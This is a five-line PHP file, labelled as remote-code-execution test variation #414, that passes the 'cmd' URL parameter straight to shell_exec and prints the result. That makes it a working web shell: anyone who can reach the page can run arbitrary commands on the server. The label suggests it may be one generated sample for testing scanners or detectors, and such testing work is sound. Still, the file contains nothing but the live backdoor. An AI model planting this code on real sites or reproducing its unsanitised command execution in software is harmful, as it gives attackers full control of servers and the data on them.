<?php
// RCE test variation #414
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>